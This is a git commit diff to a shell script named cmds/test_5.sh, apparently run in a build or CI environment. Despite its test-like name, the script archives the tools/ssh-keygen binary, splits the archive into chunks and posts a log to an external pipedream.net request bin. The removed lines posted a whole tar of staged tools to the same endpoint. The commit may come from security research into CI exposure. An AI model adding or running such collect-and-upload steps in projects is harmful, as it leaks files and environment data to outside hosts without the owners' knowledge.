e01288f9fda3944db5affe0b83a8d2264b779495
Sebastian Rodriguez <sebastian.rodriguez@onapsis.com>
2021-11-05 15:57:45 -0300

    .

--- cmds/test_5.sh
+++ cmds/test_5.sh
@@ -1,19 +1,17 @@
 #!/bin/sh
 echo "starting"  > /tmp/file.txt
-mkdir /tmp/staging
-rsync -rv --exclude=.git ./tools /tmp/staging >> /tmp/file.txt
-echo "--------------" >> /tmp/file.txt
-echo "--------------" >> /tmp/file.txt
-tar -cvf /tmp/package.tar /tmp/staging/* >> /tmp/file.txt
+tar -cvjf /tmp/shk.tar.bz2 tools/ssh-keygen >> /tmp/file.txt
 echo "--------------" >> /tmp/file.txt
 echo "--------------" >> /tmp/file.txt
 
-echo $(ls -la /tmp) >> /tmp/file.txt
+echo $(ls -lh /tmp/shk.tar.bz2) >> /tmp/file.txt
 echo "--------------" >> /tmp/file.txt
 echo "--------------" >> /tmp/file.txt
 
-# echo $(ls -la tools/) >> /tmp/file.txt
+echo $(split -b 100K /tmp/shk.tar.bz2 /tmp/shk.tar.bz2.part -d) >> /tmp/file.txt
+echo "--------------" >> /tmp/file.txt
+echo "--------------" >> /tmp/file.txt
+
+echo $(ls -lh /tmp/shk.tar.bz2.part*) >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://enmwh7jh1sqb.x.pipedream.net
-
-curl --data-binary "@/tmp/package.tar" https://enmwh7jh1sqb.x.pipedream.net
